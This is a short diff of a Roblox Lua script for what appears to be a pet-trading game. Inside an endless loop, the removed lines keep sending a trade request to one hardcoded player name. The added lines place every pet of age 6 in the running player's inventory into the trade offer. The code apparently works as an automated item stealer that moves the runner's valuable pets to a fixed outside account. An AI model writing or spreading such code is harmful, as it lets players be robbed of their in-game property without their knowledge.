@@ -455,9 +455,11 @@ local aa =0;
 local ab =0;
 
 while true do
- if not Player.PlayerGui.TradeApp.Frame.Visible then
-                        ReplicatedStorage.API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer("qweaad005")
-                    end 
+  for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
+                                if v["properties"]["age"] == 6 then
+                                    ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
+                                end 
+                            end
     a=0
     b=0
 	aa =0
